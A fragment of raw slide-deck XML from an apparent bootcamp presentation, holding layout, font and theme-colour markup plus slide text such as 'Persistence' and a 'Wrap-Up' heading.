          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="3662038"/>
            <a:ext cx="7073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Persistence</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1152" name="Google Shape;1152;p131"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="710300" y="127400"/>
            <a:ext cx="81222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Wrap-Up</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Today we covered:</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1153" name="Google Shape;1153;p131"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="192875" y="284200"/>
            <a:ext cx="459000" cy="471541"/>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Bootcamp Slides New Theme - July 2024">
  <a:themeElements>
    <a:clrScheme name="Simple Light">
      <a:dk1>
        <a:srgbClr val="2E5E73"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="082D49"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="F2F2F2"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="FCB912"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="AADCF2"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="1475D4"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="00C7CC"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="082D49"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="2E5E73"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="2E5E7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